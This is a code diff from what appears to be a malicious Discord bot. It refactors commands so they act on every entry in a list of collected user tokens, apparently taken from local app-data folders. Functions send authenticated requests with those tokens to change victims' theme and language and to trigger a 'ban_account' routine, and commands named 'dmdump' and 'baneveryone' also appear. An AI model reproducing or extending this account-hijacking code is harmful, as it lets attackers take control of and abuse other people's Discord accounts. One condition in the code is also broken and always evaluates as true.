@@ -16,6 +16,37 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 tokens = []
 
+def change_theme_backend(token, theme):
+    headers = {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+    "authorization": token
+    }
+    json = {
+        "theme": theme
+    }
+    rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+    print("code: " + str(rq.status_code))        
+
+def change_language_backend(token, language):
+    headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": token
+        }
+    json = {
+        "locale": language
+    }
+    rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+    print("code: " + str(rq.status_code))
+
+def ban_account_backend(token, id):
+    headers = {
+        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
+        "authorization": token
+    }
+    for _ in range(5):
+        requests.get("https://discord.com/api/v8/guilds/" + id + "/members", headers=headers)
+
+
 def tuple_to_string(tuple):
     str =  ''.join(tuple)
     return str
@@ -68,47 +99,19 @@ async def unfried_all(ctx):
 
 @bot.command()
 async def change_language(ctx, args):
-    headers = {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
-        "authorization": tokenworking
-        }
-    json = {
-        "locale": args
-    }
-    requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+    for token in tokens:
+        change_language_backend(token, args)
 
 @bot.command()
 async def change_theme(ctx, args):
-    print(args)
-    if args == "dark":
-        headers = {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
-        "authorization": tokenworking
-        }
-        json = {
-            "theme": "dark"
-        }
-        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
-        print("code: " + str(rq.status_code))
-    if args == "light":
-        headers = {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
-        "authorization": tokenworking
-        }
-        json = {
-            "theme": "light"
-        }
-        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
-        print("code: " + str(rq.status_code))
+    for token in tokens:
+        if args == "light" or "dark":
+            change_theme_backend(token, args)
 
 @bot.command()
 async def ban_account(ctx):
-    headers = {
-        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
-        "authorization": tokenworking
-    }
-    for _ in range(5):
-        requests.get("https://discord.com/api/v8/guilds/" + ctx.guild.id + "/members", headers=headers)
+    for token in tokens:
+        ban_account_backend(token, str(ctx.guild.id))
 
 @bot.command()
 async def dmdump(ctx):
@@ -151,10 +154,6 @@ async def baneveryone(ctx):
         except:
             print("could not ban: " + member.name)
             pass
-
-@bot.command()
-async def change_server_icon(ctx):
-    ctx.send(tuple_to_string(ctx.message.attachments))
 
 @bot.command()
 async def rename_server(ctx, *args):
